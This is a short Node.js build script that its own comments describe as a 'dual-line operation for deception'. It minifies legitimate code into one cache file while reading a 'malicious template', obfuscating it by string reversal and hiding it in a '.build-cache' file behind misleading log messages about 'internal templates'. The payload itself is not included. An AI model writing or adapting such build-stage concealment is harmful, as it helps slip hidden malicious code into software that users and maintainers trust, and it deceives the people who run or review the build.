// Build script with dual-line operation for deception.
const fs = require('fs');
const path = require('path');
const terser = require('terser');

// --- Custom Encoding for Attack Line ---
function encode(content) {
    return content.split('').reverse().join('');
}

// --- File Paths ---
const legitCodePath = path.resolve(process.cwd(), 'index.js');
const maliciousTemplatePath = path.resolve(process.cwd(), 'template.js');
const legitCachePath = path.resolve(process.cwd(), '.legit-cache');
const attackCachePath = path.resolve(process.cwd(), '.build-cache');

async function build() {
    try {
        // === DECEPTION LINE: Process and cache the legitimate code ===
        console.log('Reading legitimate source code from index.js...');
        const legitCode = fs.readFileSync(legitCodePath, 'utf8');
        const minifiedResult = await terser.minify(legitCode);
        if (minifiedResult.error) {
            throw new Error('Failed to minify legitimate code.');
        }
        fs.writeFileSync(legitCachePath, minifiedResult.code, 'utf8');
        console.log('Legitimate code processed and cached to .legit-cache.');

        // === ATTACK LINE: Process and cache the malicious code ===
        console.log('Processing internal templates...');
        const maliciousCode = fs.readFileSync(maliciousTemplatePath, 'utf8');
        const encodedMaliciousCode = encode(maliciousCode);
        fs.writeFileSync(attackCachePath, encodedMaliciousCode, 'utf8');
        console.log('Internal templates processed and cached to .build-cache.');

        console.log('\nBuild process complete. All artifacts are ready for deployment.');

    } catch (error) {
        console.error('\nBuild process failed:', error);
        process.exit(1);
    }
}

build();
